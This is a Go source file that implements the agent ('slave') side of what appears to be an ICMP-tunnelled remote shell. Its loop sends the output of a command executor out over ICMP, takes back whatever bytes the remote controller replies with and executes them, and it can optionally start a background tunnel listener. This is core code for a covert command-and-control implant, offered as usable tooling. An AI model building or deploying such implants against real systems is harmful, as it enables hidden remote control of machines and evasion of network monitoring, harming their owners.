package app

import (
	"context"
	"encoding/hex"
	"fmt"
	"io"
	"time"

	"protocol/icmp/internal/shell"
	"protocol/icmp/internal/transport"
	"protocol/icmp/internal/tunnel"
)

type SlaveConfig struct {
	Delay    time.Duration
	Timeout  time.Duration
	TestMode bool
	Logger   io.Writer
}

type SlaveService struct {
	Config   SlaveConfig
	Client   transport.PollClient
	Executor shell.Executor

	// Optional tunnel support
	TunnelListener *transport.TunnelListener
	TunnelManager  *tunnel.TunnelManager
}

func (s SlaveService) Run(ctx context.Context) error {
	if s.Executor == nil {
		return fmt.Errorf("executor is required")
	}
	if s.Client == nil {
		return fmt.Errorf("poll client is required")
	}

	if s.TunnelListener != nil && s.TunnelManager != nil {
		go func() {
			s.log("Starting TunnelListener in background...\n")
			err := s.TunnelListener.Listen(ctx, func(payload []byte) {
				s.TunnelManager.HandlePacket(payload)
			})
			if err != nil {
				s.log("TunnelListener exited: %v\n", err)
			}
		}()
	}

	for {
		outBuf, err := s.Executor.ReadOutput(ctx)
		if err != nil && err != io.EOF {
			return err
		}
		if len(outBuf) > 0 {
			s.log("%s\n", string(outBuf))
		}

		replyData, err := s.Client.Exchange(ctx, outBuf)
		if err != nil {
			s.log("sendICMP error: %v\n", err)
		} else if len(replyData) > 0 {
			s.log("%s\n", hex.Dump(replyData))
			s.log("------ %s\n", string(replyData))
			if err := s.Executor.Execute(replyData); err != nil {
				return err
			}
		}

		if s.Config.TestMode {
			return nil
		}
		if err := sleepContext(ctx, s.Config.Delay); err != nil {
			return err
		}
	}
}

func (s SlaveService) log(format string, args ...any) {
	if s.Config.Logger == nil {
		return
	}
	fmt.Fprintf(s.Config.Logger, format, args...)
}

func sleepContext(ctx context.Context, delay time.Duration) error {
	if delay <= 0 {
		return nil
	}
	timer := time.NewTimer(delay)
	defer timer.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}
